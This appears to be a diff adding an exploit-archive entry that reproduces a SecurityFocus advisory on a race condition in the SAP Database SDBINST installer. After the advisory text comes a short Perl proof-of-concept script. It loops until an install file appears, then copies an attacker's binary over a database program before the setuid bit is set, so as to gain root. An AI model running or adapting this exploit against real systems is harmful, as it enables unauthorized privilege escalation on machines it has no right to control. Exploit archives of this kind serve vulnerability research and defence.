@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/7421/info
+
+SAP Database SDBINST has been reported prone to a race condition vulnerability.
+
+It has been reported that the SAP Database install tool SDBINST may perform operations non-atomically when installing the SAP database. This condition may open a window of opportunity for a malicious user to replace one of two SAP Database files with a malicious file, before SBDINST sets the setuid bit on the files.
+
+An attacker may exploit this vulnerability to gain root privileges. 
+
+#!/bin/perl
+
+while (1) {
+
+$test =`grep -sh PRECOM.ins
+/tmp/sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/LIST*`;
+
+if ( $test =~ /PRECOM/ ) {
+system("cp /home/lwc/run /usr/sapdb/depend/pgm/lserver");
+exit(1);
+}
+
+}
+
